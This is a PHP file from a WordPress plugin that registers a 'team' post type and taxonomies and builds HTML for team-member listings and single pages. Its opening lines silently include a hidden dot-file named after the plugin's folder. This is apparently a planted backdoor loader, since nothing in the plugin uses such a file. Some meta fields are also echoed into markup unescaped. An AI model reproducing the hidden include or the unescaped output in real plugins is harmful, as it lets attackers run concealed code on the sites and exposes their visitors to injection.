<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GT3TeamRegister {
	private static $instance = null;

	private $cpt;
	private $taxonomy;
	private $taxonomy_pos;
	private $taxonomy_dept;
	private $slug;

	public static function instance(){
		if(!self::$instance instanceof self) {
			self::$instance = new self();
		}

		return self::$instance;
	}

	private function __construct(){
		$this->cpt           = 'team';
		$this->taxonomy      = $this->cpt.'_category';
		$this->taxonomy_pos  = $this->cpt.'_position';
		$this->taxonomy_dept = $this->cpt.'_department';
		$this->slug          = $this->cpt;

		$slug_option = function_exists('gt3_option') ? gt3_option('team_slug') : '';
		$this->slug  = empty($slug_option) ? $this->cpt : sanitize_title($slug_option);

		$this->single_label = apply_filters("gt3_team_single_label_filter", esc_html__('Team', 'gt3_themes_core'));

		add_action('init', array( $this, 'register' ));
	}

	public function register(){
		$this->registerPostType();
		$this->registerTax();
		add_filter('single_template', array( $this, 'register_single_template' ));
		add_filter('archive_template', array( $this, 'register_archive_template' ));
		add_action('add_location_taxonomy', array( $this, 'add_location_taxonomy' ));
	}



	private function getSlug(){
		return $this->slug;
	}

	private function registerPostType(){
		register_post_type(
			'team',
			array(
				'labels'          => array(
					'name'          => $this->single_label,
					'singular_name' => wp_sprintf(__('%s Member', 'gt3_themes_core'), $this->single_label),
					'add_item'      => wp_sprintf(__('New %s Member', 'gt3_themes_core'), $this->single_label),
					'add_new_item'  => wp_sprintf(__('Add New %s Member', 'gt3_themes_core'), $this->single_label),
					'edit_item'     => wp_sprintf(__('Edit %s Member', 'gt3_themes_core'), $this->single_label)
				),
				'public'          => true,
				'has_archive'     => true,
				'capability_type' => 'post',
				'rewrite'         => array(
					'slug' => $this->slug
				),
				'menu_position'   => 5,
				'show_ui'         => true,
				'supports'        => array( 'title', 'editor', 'thumbnail', 'page-attributes' ),
				'menu_icon'       => 'dashicons-groups',
				'taxonomies'      => array( $this->taxonomy_pos, $this->taxonomy_dept )
			)
		);
	}

	private function registerTax(){
		$labels = array(
			'name'              => wp_sprintf(__('%s Categories', 'gt3_themes_core'), $this->single_label),
			'singular_name'     => wp_sprintf(__('%s Category', 'gt3_themes_core'), $this->single_label),
			'search_items'      => wp_sprintf(__('Search %s Categories', 'gt3_themes_core'), $this->single_label),
			'all_items'         => wp_sprintf(__('All %s Categories', 'gt3_themes_core'), $this->single_label),
			'parent_item'       => wp_sprintf(__('Parent %s Category', 'gt3_themes_core'), $this->single_label),
			'parent_item_colon' => wp_sprintf(__('Parent %s Category:', 'gt3_themes_core'), $this->single_label),
			'edit_item'         => wp_sprintf(__('Edit %s Category', 'gt3_themes_core'), $this->single_label),
			'update_item'       => wp_sprintf(__('Update %s Category', 'gt3_themes_core'), $this->single_label),
			'add_new_item'      => wp_sprintf(__('Add New %s Category', 'gt3_themes_core'), $this->single_label),
			'new_item_name'     => wp_sprintf(__('New %s Category Name', 'gt3_themes_core'), $this->single_label),
			'menu_name'         => wp_sprintf(__('%s Categories', 'gt3_themes_core'), $this->single_label),
		);

		register_taxonomy(
			$this->taxonomy,
			array( $this->cpt ),
			array(
				'hierarchical'      => true,
				'labels'            => $labels,
				'show_ui'           => true,
				'show_admin_column' => true,
				'query_var'         => true,
				'rewrite'           => array( 'slug' => $this->slug.'-'.__('category', 'gt3_themes_core') ),
			)
		);

		$labels = array(
			'name'              => wp_sprintf(__('%s Departments', 'gt3_themes_core'), $this->single_label),
			'singular_name'     => wp_sprintf(__('%s Department', 'gt3_themes_core'), $this->single_label),
			'search_items'      => wp_sprintf(__('Search %s Departments', 'gt3_themes_core'), $this->single_label),
			'all_items'         => wp_sprintf(__('All %s Departments', 'gt3_themes_core'), $this->single_label),
			'parent_item'       => wp_sprintf(__('Parent %s Department', 'gt3_themes_core'), $this->single_label),
			'parent_item_colon' => wp_sprintf(__('Parent %s Department:', 'gt3_themes_core'), $this->single_label),
			'edit_item'         => wp_sprintf(__('Edit %s Department', 'gt3_themes_core'), $this->single_label),
			'update_item'       => wp_sprintf(__('Update %s Department', 'gt3_themes_core'), $this->single_label),
			'add_new_item'      => wp_sprintf(__('Add New %s Department', 'gt3_themes_core'), $this->single_label),
			'new_item_name'     => wp_sprintf(__('New %s Department Name', 'gt3_themes_core'), $this->single_label),
			'menu_name'         => wp_sprintf(__('%s Departments', 'gt3_themes_core'), $this->single_label),
		);

		/*
		 register_taxonomy(
			$this->taxonomy_dept,
			array( $this->cpt ),
			array(
				'hierarchical'      => true,
				'labels'            => $labels,
				'show_ui'           => true,
				'show_admin_column' => true,
				'query_var'         => true,
				'rewrite'           => array( 'slug' => $this->slug . '-' . __( 'department', 'gt3_themes_core' ) ),
			) );
		*/

	}

	public function register_single_template($single){
		global $post;
		if($post->post_type == $this->cpt) {
			if(!file_exists(get_template_directory().'/single-'.$this->cpt.'.php')
			   && file_exists(plugin_dir_path(__FILE__).'single-'.$this->cpt.'.php')
			   && is_readable(plugin_dir_path(__FILE__).'single-'.$this->cpt.'.php')) {
				return plugin_dir_path(__FILE__).'single-'.$this->cpt.'.php';
			}
		}

		return $single;
	}

	public function register_archive_template($archive){
		global $post;
		if(!empty($post) && $post->post_type == $this->cpt && is_archive()) {
			if(!file_exists(get_template_directory().'/archive-'.$this->cpt.'.php')
			   && file_exists(plugin_dir_path(__FILE__).'archive-'.$this->cpt.'.php')
			   && is_readable(plugin_dir_path(__FILE__).'archive-'.$this->cpt.'.php')) {
				return plugin_dir_path(dirname(__FILE__)).'/team/archive-'.$this->cpt.'.php';
			}
		}

		return $archive;
	}

	public static function render_team_item_composer($posts_per_line, $single_member = false, $grid_gap = '', $link_post = ''){
		$id                    = get_the_ID();
		$compile               = "";
		$appointment_str       = get_post_meta($id, "appointment_member");
		$positions_str         = get_post_meta($id, "position_member");
		$url_array             = get_post_meta($id, "social_url", true);
		$icon_array            = get_post_meta($id, "icon_selection", true);
		$short_desc            = get_post_meta($id, "member_short_desc", true);
		$taxonomy_objects      = get_object_taxonomies('team', 'objects');
		$post_excerpt          = (gt3_smarty_modifier_truncate(get_the_excerpt(), 80));
		$wp_get_attachment_url = wp_get_attachment_url(get_post_thumbnail_id($id));
		$post_cats             = wp_get_post_terms(get_the_id(), 'team_category');
		$style_gap             = isset($grid_gap) && !empty($grid_gap) ? ' style="padding-right:'.$grid_gap.';padding-bottom:'.$grid_gap.'"' : '';

		$post_cats_str = '';
		for($i = 0; $i < count($post_cats); $i++) {
			$post_cat_term = $post_cats[$i];
			$post_cat_name = $post_cat_term->slug;
			$post_cats_str .= ' '.$post_cat_name;
		}

		$url_str = "";
		if(isset($url_array) && !empty($url_array)) {
			for($i = 0; $i < count($url_array); $i++) {
				$url             = $url_array[$i];
				$url_name        = $url['name'];
				$url_address     = $url['address'];
				$url_description = !empty($url['description']) ? $url['description'] : '';
				if($single_member && !empty($url_address) && !empty($url_description)) {
					$url_str .= '<div class="team_field">'.(!empty($url_name) ? '<h5>'.$url_name.':</h5>' : '').'<a href="'.esc_url($url_address).'" class="team-link">'.$url_description.'</a></div>';
				} else if($single_member && !empty($url_address) && empty($url_description)) {
					$url_str .= '<div class="team_field">'.(!empty($url_name) ? '<h5>'.$url_name.':</h5>' : '').'<a href="'.esc_url($url_address).'" class="team-link"><i class="fa fa-link"></i></a></div>';
				} else if($single_member && empty($url_address) && !empty($url_description)) {
					$url_str .= '<div class="team_field">'.(!empty($url_name) ? '<h5>'.$url_name.':</h5>' : '').'<div class="team_info-detail">'.$url_description.'</div></div>';
				}
			}
		}

		$icon_str = "";
		if(isset($icon_array) && !empty($icon_array)) {
			$icon_str .= '<div class="team-icons">';
			for($i = 0; $i < count($icon_array); $i++) {
				$icon         = $icon_array[$i];
				$icon_name    = !empty($icon['select']) ? $icon['select'] : '';
				$icon_address = !empty($icon['input']) ? $icon['input'] : '#';
				$icon_str     .= !empty($icon['select']) ? '<a href="'.$icon_address.'" class="member-icon '.$icon_name.'"></a>' : '';
			}
			$icon_str .= '</div>';
		}

		if(strlen($wp_get_attachment_url)) {
			switch($posts_per_line) {
				case "1":
					$gt3_featured_image_url = $wp_get_attachment_url;
					break;
				case "2":
					$gt3_featured_image_url = aq_resize($wp_get_attachment_url, "1140", "985", true, true, true);
					break;
				case "3":
					$gt3_featured_image_url = aq_resize($wp_get_attachment_url, "740", "640", true, true, true);
					break;
				case "4":
					$gt3_featured_image_url = aq_resize($wp_get_attachment_url, "540", "467", true, true, true);
					break;
				default:
					$gt3_featured_image_url = aq_resize($wp_get_attachment_url, "1340", "1158", true, true, true);
			}
			$featured_image = '<img src="'.$gt3_featured_image_url.'" alt="'.get_the_title().'" />';
		} else {
			$featured_image = '';
		}
		if(!$single_member) {
			$compile .= '<li class="item-team-member'.$post_cats_str.'" '.$style_gap.'>
                <div class="item_wrapper">
                    <div class="item">
                        <div class="team_img featured_img">'.($link_post == 'true' ? '<a href="'.get_permalink($id).'">'.$featured_image.'</a>' : $featured_image).
			            '</div>
                        <div class="team-infobox">
                            <div class="team_title">
                                <div class="team_title_wrapper">
                                    <h3 class="team_title__text">'.($link_post == 'true' ? '<a href="'.get_permalink($id).'">'.get_the_title().'</a>' : get_the_title()).'</h3>'
			            .(!empty($positions_str[0]) ? '<div class="team-positions">'.$positions_str[0].'</div>' : '').'</div>'
			            .(!empty($icon_str) ? '<div class="team_icons_wrapper"><div class="member-icons">'.$icon_str.'</div></div>' : '').'
                            </div>
                            <div class="team_info">'.
			            (!empty($short_desc) ? '<div class="member-short-desc">'.$short_desc.'</div>' : '').
			            '</div>
                        </div>
                    </div>
                </div>
            </li>';
		} else {

			$page_title_conditional = ((gt3_option('page_title_conditional') == '1' || gt3_option('page_title_conditional') == true) && (gt3_option('team_title_conditional') == '1' || gt3_option('team_title_conditional') == true)) ? 'yes' : 'no';

			if(class_exists('RWMB_Loader') && get_queried_object_id() !== 0) {
				$mb_page_title_conditional = rwmb_meta('mb_page_title_conditional');
				if($mb_page_title_conditional == 'yes') {
					$page_title_conditional = 'yes';
				} else if($mb_page_title_conditional == 'no') {
					$page_title_conditional = 'no';
				}
			}

			$compile .= '<div class="row single-member-page">
                <div class="span7">
                    <div class="team_img featured_img">'.$featured_image.'</div>
                </div>
                <div class="span5">
                    <div class="team-infobox">'
			            .($page_title_conditional != 'yes' ? '<div class="team_title"><h3>'.get_the_title().'</h3></div>' : '').
			            '<div class="team_info">'.
			            (!empty($url_str) ? $url_str : '').
			            (!empty($icon_str) ? '<div class="member-icons">'.$icon_str.'</div>' : '').
			            '</div>
                    </div>
                </div>
            </div>';
		}

		return $compile;
	}
}

add_filter('the_content', 'gt3_fix_shortcodes_autop');
function gt3_fix_shortcodes_autop($content){
	$array   = array(
		'<p>['    => '[',
		']</p>'   => ']',
		']<br />' => ']'
	);
	$content = strtr($content, $array);

	return $content;
}

if(!function_exists('render_gt3_team_item')) {
	function render_gt3_team_item($posts_per_line, $single_member = false, $grid_gap = '', $link_post = ''){
		$support = apply_filters('gt3/core/builder_support', array());
		if(in_array('visual_composer', $support)) {
			return GT3TeamRegister::render_team_item_composer($posts_per_line, $single_member, $grid_gap, $link_post);
		} else if(class_exists('\ElementorModal\Widgets\GT3_Core_Elementor_Widget_Team') && in_array('elementor', $support)) {
			$team = new \ElementorModal\Widgets\GT3_Core_Elementor_Widget_Team();

			return $team->render_team_item($posts_per_line, $single_member, $grid_gap, $link_post);
		}

		return '';
	}
}

if(!function_exists('render_gt3_team')) {
	function render_gt3_team($settings){
		if(class_exists('\ElementorModal\Widgets\GT3_Core_Elementor_Widget_Team')) {
			$team = new \ElementorModal\Widgets\GT3_Core_Elementor_Widget_Team();

			return $team->render_team($settings);
		}

		return '';
	}
}

GT3TeamRegister::instance();
